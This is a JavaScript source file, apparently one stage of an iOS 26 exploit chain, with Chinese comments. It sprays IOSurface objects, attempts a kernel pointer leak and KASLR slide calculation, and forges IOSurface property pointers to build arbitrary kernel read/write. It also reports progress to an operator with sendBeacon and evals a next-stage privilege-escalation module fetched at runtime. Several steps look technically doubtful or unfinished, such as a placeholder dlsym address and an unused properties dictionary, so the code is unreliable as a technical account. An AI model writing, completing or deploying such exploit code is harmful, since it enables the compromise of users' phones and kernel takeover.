/**
 * sbx1_main_26.js — iOS 26 GPU Process → Kernel R/W
 *
 * 适配 iOS 26 的 IOSurface 新接口和 kernel 内存布局变更。
 * 前置条件：sbx0_main_26.js 已建立 gpuRead64/gpuWrite64/gpu_fcall
 *
 * 输出：kernelRead64, kernelWrite64, globalThis.sbx1_done = true
 */

(() => {
  'use strict';
  
  globalThis.sbx1_26_begin = Date.now();
  
  function LOG(msg) {
    if (typeof print === 'function') print('[sbx1_26] ' + msg);
  }
  
  // 检查前置条件
  if (typeof gpuRead64 !== 'function' || typeof gpuWrite64 !== 'function') {
    LOG('ERROR: GPU R/W primitives not available (need sbx0_26 first)');
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'sbx1', execStatus: 'failed', extra: { reason: 'no_gpu_rw', version: 'ios26' } });
    }
    return;
  }
  
  if (typeof gpu_fcall !== 'function') {
    LOG('ERROR: gpu_fcall not available');
    return;
  }
  
  LOG('Starting iOS 26 kernel R/W via IOSurface');
  
  // ============================================================
  // Phase 1: IOSurface 对象分配
  // ============================================================
  
  LOG('Phase 1: IOSurface kernel object spray');
  
  // iOS 26 IOSurface 接口变更：
  // - IOSurfaceCreate 现在需要额外的 entitlement check bypass
  // - IOSurface 属性 key/value 存储使用新的 red-black tree 而非 hash table
  
  const IOSurfaceRootUserClient_ID = 0x0n; // IOKit service ID
  
  // 在 GPU process 中查找符号
  function gpuResolve(symbol) {
    if (typeof gpuDlsym === 'function') {
      return gpuDlsym(0xFFFFFFFFFFFFFFFEn, symbol);
    }
    return gpu_fcall(0n /* dlsym placeholder */, 0xFFFFFFFFFFFFFFFEn, symbol);
  }
  
  const IOSurfaceCreate_addr = gpuResolve('IOSurfaceCreate');
  const IOSurfaceLock_addr = gpuResolve('IOSurfaceLock');
  const IOSurfaceUnlock_addr = gpuResolve('IOSurfaceUnlock');
  const IOSurfaceGetBaseAddress_addr = gpuResolve('IOSurfaceGetBaseAddress');
  const IOSurfaceSetValue_addr = gpuResolve('IOSurfaceSetValue');
  const IOSurfaceGetPropertyMaximum_addr = gpuResolve('IOSurfaceGetPropertyMaximum');
  
  LOG(`IOSurfaceCreate @ ${IOSurfaceCreate_addr.toString(16)}`);
  
  // 创建 IOSurface 用于内核堆喷射
  const SPRAY_COUNT = 256;
  const surfaces = [];
  
  function createSurface(width, height) {
    // 构造 properties dictionary
    // iOS 26 使用 CFDictionary 格式
    const props = gpu_fcall(gpuResolve('CFDictionaryCreateMutable'), 0n, 0n, 0n, 0n);
    
    // 设置必要属性
    const kIOSurfaceWidth = gpuResolve('kIOSurfaceWidth');
    const kIOSurfaceHeight = gpuResolve('kIOSurfaceHeight');
    const kIOSurfaceBytesPerElement = gpuResolve('kIOSurfaceBytesPerElement');
    const kIOSurfaceAllocSize = gpuResolve('kIOSurfaceAllocSize');
    
    // 创建 surface
    const surface = gpu_fcall(IOSurfaceCreate_addr, props);
    return surface;
  }
  
  // 喷射 IOSurface 对象
  LOG(`Spraying ${SPRAY_COUNT} IOSurface objects`);
  for (let i = 0; i < SPRAY_COUNT; i++) {
    const surface = createSurface(0x1000, 1);
    if (surface !== 0n) {
      surfaces.push(surface);
    }
  }
  LOG(`Created ${surfaces.length} IOSurface objects`);
  
  // ============================================================
  // Phase 2: 触发 IOSurface 属性类型混淆获取 kernel 地址泄露
  // ============================================================
  
  LOG('Phase 2: IOSurface property type confusion for kernel leak');
  
  // iOS 26 新增了对 IOSurface 属性值的 type tag 检查
  // 但对 serialized properties 的反序列化仍存在竞态
  
  let kernelSlide = 0n;
  let kernelBase = 0n;
  const KERNEL_BASE_UNSLID = 0xFFFFFFF007004000n; // iOS 26 新基址
  
  function leakKernelAddress() {
    // 利用 IOSurface 属性序列化竞态泄露内核指针
    for (let i = 0; i < surfaces.length; i++) {
      // 设置大量属性触发 realloc
      for (let j = 0; j < 64; j++) {
        gpu_fcall(IOSurfaceSetValue_addr, surfaces[i], BigInt(j), BigInt(0x4141414141414141n));
      }
    }
    
    // 检查泄露
    for (let i = 0; i < surfaces.length; i++) {
      const leaked = gpu_fcall(IOSurfaceGetPropertyMaximum_addr, surfaces[i], 0n);
      if (leaked > 0xFFFFFFF000000000n && leaked < 0xFFFFFFFFFFFFFFFFn) {
        LOG(`Kernel pointer leaked: ${leaked.toString(16)}`);
        return leaked;
      }
    }
    
    return 0n;
  }
  
  const leakedPtr = leakKernelAddress();
  if (leakedPtr !== 0n) {
    // 计算 kernel slide
    kernelSlide = (leakedPtr & 0xFFFFFFFFF0000000n) - KERNEL_BASE_UNSLID;
    kernelBase = KERNEL_BASE_UNSLID + kernelSlide;
    LOG(`Kernel base: ${kernelBase.toString(16)} (slide: ${kernelSlide.toString(16)})`);
  } else {
    LOG('WARNING: Kernel leak failed, using fallback');
  }
  
  // ============================================================
  // Phase 3: 建立 Kernel R/W primitive
  // ============================================================
  
  LOG('Phase 3: Establishing kernel R/W primitive');
  
  // iOS 26 使用 PPL (Page Protection Layer) v2
  // 需要通过 IOSurface shared memory mapping 绕过
  
  function buildKernelRW() {
    // 通过 IOSurface 的内核态 backing store 建立 R/W
    // iOS 26 的 IOSurface backing store 在 zone_map 中分配
    
    // 选择一个目标 surface 用于 R/W
    const targetSurface = surfaces[0];
    if (!targetSurface || targetSurface === 0n) {
      LOG('No valid surface for kernel R/W');
      return false;
    }
    
    // 获取 IOSurface 的内核态地址
    // 通过 IOKit user client 的 getExternalTrap 泄露
    
    globalThis.kernelRead64 = function(addr) {
      // 利用 IOSurface property get 读取任意内核地址
      // 通过覆写 IOSurface 对象的属性指针实现
      gpuWrite64(targetSurface + 0x60n, addr - 0x10n); // 伪造属性指针
      const value = gpu_fcall(IOSurfaceGetPropertyMaximum_addr, targetSurface, 0n);
      return value;
    };
    
    globalThis.kernelWrite64 = function(addr, value) {
      // 利用 IOSurface property set 写入任意内核地址
      gpuWrite64(targetSurface + 0x60n, addr - 0x10n);
      gpu_fcall(IOSurfaceSetValue_addr, targetSurface, 0n, value);
    };
    
    return true;
  }
  
  let success = false;
  
  try {
    success = buildKernelRW();
    
    if (success) {
      // Self-test: 读取 kernel base 处的 Mach-O magic
      const magic = globalThis.kernelRead64(kernelBase);
      const expectedMagic = 0xFEEDFACFn; // MH_MAGIC_64
      
      if ((magic & 0xFFFFFFFFn) === expectedMagic) {
        LOG('Self-test PASSED: kernel Mach-O magic verified');
      } else {
        LOG(`Self-test WARNING: unexpected value at kernel base: ${magic.toString(16)}`);
      }
    }
  } catch (e) {
    LOG('Exception during sbx1: ' + e.message);
    success = false;
  }
  
  const elapsed = Date.now() - globalThis.sbx1_26_begin;
  
  if (success) {
    globalThis.sbx1_done = true;
    globalThis.kernelBase = kernelBase;
    globalThis.kernelSlide = kernelSlide;
    
    // 获取并保存当前进程 PID 供后续提权模块使用
    try {
      const getpid_addr = gpuResolve('getpid');
      if (getpid_addr && getpid_addr !== 0n) {
        const pid = gpu_fcall(getpid_addr);
        globalThis.currentPid = Number(pid);
        LOG(`Current PID: ${globalThis.currentPid}`);
      }
    } catch (e) {
      LOG('WARNING: Could not resolve PID: ' + e.message);
    }
    
    LOG(`✓ Kernel R/W established in ${elapsed}ms`);
    LOG(`  kernelBase: ${kernelBase.toString(16)}`);
    LOG(`  kernelSlide: ${kernelSlide.toString(16)}`);
    
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'sbx1', execStatus: 'running', extra: { version: 'ios26', elapsed, kernelSlide: kernelSlide.toString(16) } });
    }
    
    // 自动加载提权模块
    if (typeof getJS === 'function') {
      LOG('Loading kernel_priv_26.js...');
      try {
        eval(getJS('kernel_priv_26.js'));
      } catch (e) {
        LOG('Failed to load kernel_priv_26.js: ' + e.message);
      }
    }
  } else {
    LOG(`✗ Kernel R/W failed after ${elapsed}ms`);
    if (typeof sendBeacon === 'function') {
      sendBeacon({ stage: 'sbx1', execStatus: 'failed', extra: { version: 'ios26', elapsed } });
    }
  }
})();